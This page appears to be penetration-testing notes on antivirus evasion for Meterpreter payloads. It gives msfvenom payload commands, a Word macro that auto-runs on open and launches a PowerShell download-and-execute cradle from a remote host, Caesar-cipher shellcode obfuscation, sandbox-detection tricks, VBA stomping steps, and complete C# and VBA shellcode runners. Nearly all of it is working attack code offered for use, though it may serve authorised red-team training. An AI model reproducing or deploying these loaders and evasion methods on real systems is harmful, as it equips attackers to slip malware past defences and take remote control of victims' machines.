---
title: Methods
layout: default
parent: Antivirus Evasion
nav_order: 1
---

# Effective Methods
[Ineffective Methods](#ineffective-methods)
[Original Shellcode](#original-shellcode)
[Original VBA Code](#original-vba-code)

## Powershell Inside VBA ##


1. Must use 64 bit for the Powershell shellcode runner:
`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f vbapplication`

2. Avoid using Shell function:
```
Sub MyMacro
  strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
  GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub

Sub AutoOpen()
    Mymacro
End Sub
```


## Encrypting C# Shellcode with Caesar cipher ##

1. Generate a C# shellcode:
`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f csharp`

2. Create a new Helper program with our generated shellcode:

```
namespace Helper
{
    class Program
    {
        static void Main(string[] args)
        {
            byte[] buf = new byte[752] {}
                
            byte[] encoded = new byte[buf.Length];
            for(int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
            }

            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach(byte b in encoded)
            {
                hex.AppendFormat("0x{0:x2}, ", b);
            }

            Console.WriteLine("The payload is: " + hex.ToString());
        }
    }
}
```

3. Refer to the [original C# Shellcode](#original-shellcode). Add the following code under the shellcode:

```
for(int i = 0; i < buf.Length; i++)
{
    buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
}
```

## Detect Simulation with Sleep Timers ##

1. Generate a C# shellcode:
`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f csharp`

2. Refer to the [original C# Shellcode](#original-shellcode), and can also combine it with the Caesar cipher.

3. Insert the following code:

```
[DllImport("kernel32.dll")]
static extern void Sleep(uint dwMilliseconds);
        
static void Main(string[] args)
{
    DateTime t1 = DateTime.Now;
    Sleep(2000);
    double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
    if(t2 < 1.5)
    {
        return;
    }
```

## Detect Simulation with Non-emulated APIs ##

1. Generate a C# shellcode:
`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f csharp`

2. Refer to the [original C# Shellcode](#original-shellcode), and can also combine it with the Caesar cipher.

3. Insert the following code:

```
...
[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, 
    uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

[DllImport("kernel32.dll")]
static extern IntPtr GetCurrentProcess();

...

IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
if(mem == null)
{
    return;
}
```

## VBA Stomping ##

1. FlexHEX -> File -> Open -> OLE Compound File...

2. Lower left Navigation pane -> Macro -> PROJECT. Click on this.

3. Upper left window got ASCII line "Module=NewMacro" (4D 6F 64 75 6C 65...). Highlight this (include all the end spaces but not the beginning spaces).

4. Edit -> Insert Zero Block. Ok and save it.

5. Lower left Navigation pane -> Macro -> VBA -> NewMacros. Click on this.

6. Upper left window got ASCII line "Attribute VB_Name"(41 74 74 72 69 62...). Highlight this until the entire end.

7. Edit -> Insert Zero Block. Ok and save it.

8. Can also use Evil Clippy to automate the process.

Note: VBA Stomping does not work for files saved in the Excel 97-2003 Workbook (.xls) format


# Ineffective Methods
[Effective Methods](#effective-methods)
[Original Shellcode](#original-shellcode)
[Original VBA Code](#original-vba-code)

## Metasploit Encoders ##

1. Listing all the available encoders:
`msfvenom --list encoders`

2. 32-bit encoder(shikata_ga_nai):
`msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -e x86/shikata_ga_nai -f exe -o /tmp/met.exe`

3. 64-bit encoder(zutto_dekiru):
`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -e x64/zutto_dekiru -f exe -o /tmp/met64_zutto.exe`

4. Specifying a different template (for eg notepad.exe) for the generated executable on top of zutto encoder:
`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.176.134 LPORT=443 -e x64/zutto_dekiru -x /home/kali/notepad.exe -f exe -o /tmp/met64_notepad.exe`

## Metasploit Encryptors ##

1. Listing all the available encryptors:
`msfvenom --list encrypt`

2. Encrypt using aes256:
`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 --encrypt aes256 --encrypt-key fdgdgj93jf43uj983uf498f43 -f exe -o /tmp/met64_aes.exe`


## Caesar Cipher on VBA ##

1. Generate a VBA shellcode:
`msfvenom -p windows/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f vbapplication`

2. Create a new Helper program with our generated shellcode:

```
namespace Helper
{
    class Program
    {
        static void Main(string[] args)
        {
            byte[] buf = new byte[752] {}
                
            byte[] encoded = new byte[buf.Length];
            for(int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
            }

            uint counter = 0;

            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach(byte b in encoded)
            {
                hex.AppendFormat("{0:D}, ", b);
                counter++;
                if(counter % 50 == 0)
                {
                    hex.AppendFormat("_{0}", Environment.NewLine);
                }
            }

            Console.WriteLine("The payload is: " + hex.ToString());
        }
    }
}
```

3. Refer to the [original VBA Code](#original-vba-code). Add the following code under the shellcode:

```
For i = 0 To UBound(buf)
    buf(i) = buf(i) - 2
Next i
```

## Sleep Timer on VBA ##

1. Generate a VBA shellcode:
`msfvenom -p windows/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f vbapplication`

2. Refer to the [original VBA Code](#original-vba-code), and can also combine it with the Caesar cipher.

```
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
...
Dim t1 As Date
Dim t2 As Date
Dim time As Long

t1 = Now()
Sleep (2000)
t2 = Now()
time = DateDiff("s", t1, t2)

If time < 2 Then
    Exit Function
End If
...
```


# Original Shellcode
[Effective Methods](#effective-methods)
[Ineffective Methods](#ineffective-methods)
[Original VBA Code](#original-vba-code)

```
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, 
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, 
                  uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, 
            UInt32 dwMilliseconds);
        
        static void Main(string[] args)
        {
            byte[] buf = new byte[752] {
              0xfc,0x48,0x83,0xe4...

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, 
                IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```
# Original VBA Code
[Effective Methods](#effective-methods)
[Ineffective Methods](#ineffective-methods)
[Original Shellcode](#original-shellcode)

```
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function mymacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    
    buf = Array(232, 130, 0, 0, 0, 96, 137, 229, 49, 192, 100, 139, 80, 48, 139, 82, 12, 139, 82, 20, 139, 114, 40, 15, 183, 74, 38, 49, 255, 172, 60, 97, 124, 2, 44, 32, 193, 207, 13, 1, 199, 226, 242, 82, 87, 139, 82, 16, 139, 74, 60, 139, 76, 17, 120, 227, 72, 1, 209, 81, 139, 89, 32, 1, 211, 139, 73, 24, 227, 58, 73, 139, 52, 139, 1, 214, 49, 255, 172, 193, _
...
49, 57, 50, 46, 49, 54, 56, 46, 49, 55, 54, 46, 49, 52, 50, 0, 187, 224, 29, 42, 10, 104, 166, 149, 189, 157, 255, 213, 60, 6, 124, 10, 128, 251, 224, 117, 5, 187, 71, 19, 114, 111, 106, 0, 83, 255, 213)

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)

Sub Document_Open()
    mymacro
End Sub

Sub AutoOpen()
    mymacro
End Sub

End Function
```